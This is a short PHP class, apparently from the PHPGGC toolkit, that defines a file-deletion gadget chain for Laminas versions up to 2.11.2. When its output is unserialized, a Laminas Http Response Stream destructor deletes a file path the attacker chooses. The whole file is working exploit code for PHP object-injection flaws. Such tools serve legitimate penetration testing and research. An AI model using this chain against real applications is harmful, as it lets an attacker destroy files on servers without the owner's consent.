<?php

namespace GadgetChain\Laminas;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 2.11.2';
    public static $vector = '__destruct';
    public static $author = 'MrTuxracer';

    public function generate(array $parameters)
    {
        $remote_path = $parameters["remote_path"];

        return new \Laminas\Http\Response\Stream($remote_path);
    }
}
